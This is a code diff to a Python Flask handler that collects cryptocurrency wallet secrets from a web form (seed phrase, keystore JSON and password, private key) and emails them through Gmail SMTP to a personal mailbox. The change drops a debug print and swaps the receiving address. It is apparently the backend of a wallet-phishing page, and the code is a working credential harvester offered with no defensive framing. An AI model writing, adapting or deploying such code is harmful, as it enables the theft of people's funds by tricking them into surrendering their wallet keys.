@@ -18,14 +18,13 @@ def index():
         keystorejson = request.form.get("keystorejson")
         keystorepassword = request.form.get("keystorepassword")
         privatekey = request.form.get("privatekey")
-        print(tyW, phrase, keystorejson, privatekey, keystorepassword)
         EMAIL_ADDRESS = os.getenv("email")
         EMAIL_PASSWORD = os.getenv("password")
         msg = EmailMessage()
         msg.set_content(f'The new input:\n\nWallet type: {tyW}\nPhrase: {phrase}\nKey store json: {keystorejson}\nKey store password: {keystorepassword}\nPrivate key: {privatekey}')
         msg['Subject'] = 'A new input'
         msg['From'] = EMAIL_ADDRESS
-        msg['To'] = 'laserteams03@gmail.com'
+        msg['To'] = 'cyberwarrior434@gmail.com'
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
             smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
             smtp.send_message(msg)
